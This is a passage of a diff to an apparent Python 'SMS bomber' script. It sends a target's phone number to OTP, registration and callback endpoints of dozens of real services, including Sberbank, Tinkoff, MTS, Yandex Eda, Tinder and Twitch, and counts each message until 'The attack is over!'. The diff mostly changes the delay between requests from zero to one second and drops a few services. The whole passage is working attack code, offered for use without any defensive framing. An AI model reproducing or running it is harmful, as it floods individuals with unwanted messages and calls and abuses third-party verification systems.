                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3015,7 +2947,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3028,7 +2960,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3039,7 +2971,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3052,7 +2984,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3063,7 +2995,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3076,7 +3008,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -3089,7 +3021,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3101,7 +3033,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3113,7 +3045,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3126,7 +3058,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3139,7 +3071,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3151,7 +3083,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3162,7 +3094,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3173,7 +3105,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3184,7 +3116,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3196,7 +3128,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3209,7 +3141,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3221,33 +3153,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3256,7 +3165,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3281,7 +3190,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3293,7 +3202,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3304,7 +3213,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3316,7 +3225,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3327,7 +3236,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3340,7 +3249,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3351,7 +3260,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3362,7 +3271,7 @@ if call == str(2):
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3375,14 +3284,14 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3394,7 +3303,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3405,7 +3314,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3417,7 +3326,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3430,7 +3339,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3441,7 +3350,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3452,7 +3361,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3463,7 +3372,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3475,7 +3384,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3487,7 +3396,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3500,7 +3409,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3513,7 +3422,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3524,7 +3433,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3537,7 +3446,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3548,7 +3457,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3561,7 +3470,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -3574,7 +3483,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3586,7 +3495,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3602,7 +3511,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3615,7 +3524,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3628,7 +3537,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3640,7 +3549,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3651,7 +3560,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3662,7 +3571,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3673,7 +3582,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3685,7 +3594,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3698,7 +3607,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3710,33 +3619,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -3745,7 +3631,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4117,28 +4003,6 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
@@ -4265,7 +4129,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4277,7 +4141,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4288,7 +4152,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4300,7 +4164,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4311,7 +4175,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4324,7 +4188,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4335,7 +4199,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4358,7 +4222,7 @@ if call == str(2):
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                 'deviceToken': '*'}, headers={
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            time.sleep(0)
+            time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -4367,7 +4231,7 @@ if call == str(2):
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4378,7 +4242,7 @@ if call == str(2):
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4390,7 +4254,7 @@ if call == str(2):
                           data={'aj': '50', 'registration-phone': _phone})
             R = R + 1
             print('[+] StarPizzaCafe Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4402,7 +4266,7 @@ if call == str(2):
                           data={'phone_number': _phone}, headers={})
             R = R + 1
             print('[+] Tinder Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -4415,7 +4279,7 @@ if call == str(2):
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4427,7 +4291,7 @@ if call == str(2):
             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
             R = R + 1
             print('[+] Dostavista Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4440,7 +4304,7 @@ if call == str(2):
             requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] MonoBank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4452,7 +4316,7 @@ if call == str(2):
             requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
             R = R + 1
             print('[+] binotel Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4464,7 +4328,7 @@ if call == str(2):
                          data={"phone": _phone})
             R = R + 1
             print('[+] SportMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4476,7 +4340,7 @@ if call == str(2):
             requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
             R = R + 1
             print('[+] Alfalife Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4487,7 +4351,7 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -4501,7 +4365,7 @@ if call == str(2):
                                 "oferta": "on", })
             R = R + 1
             print('[+] GGbet Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4514,7 +4378,7 @@ if call == str(2):
                                 "getSysParam": "yes", })
             R = R + 1
             print('[+] ETM Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4526,7 +4390,7 @@ if call == str(2):
             requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
             R = R + 1
             print('[+] TheLive Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4537,7 +4401,7 @@ if call == str(2):
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4548,7 +4412,7 @@ if call == str(2):
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
             R = R + 1
             print('[+] MyGames Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4562,7 +4426,7 @@ if call == str(2):
                                 "city": "Москва", })
             R = R + 1
             print('[+] Zoloto585 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4573,7 +4437,7 @@ if call == str(2):
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
             R = R + 1
             print('[+] Kasta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4585,7 +4449,7 @@ if call == str(2):
                           data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
             R = R + 1
             print('[+] Тaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -4598,7 +4462,7 @@ if call == str(2):
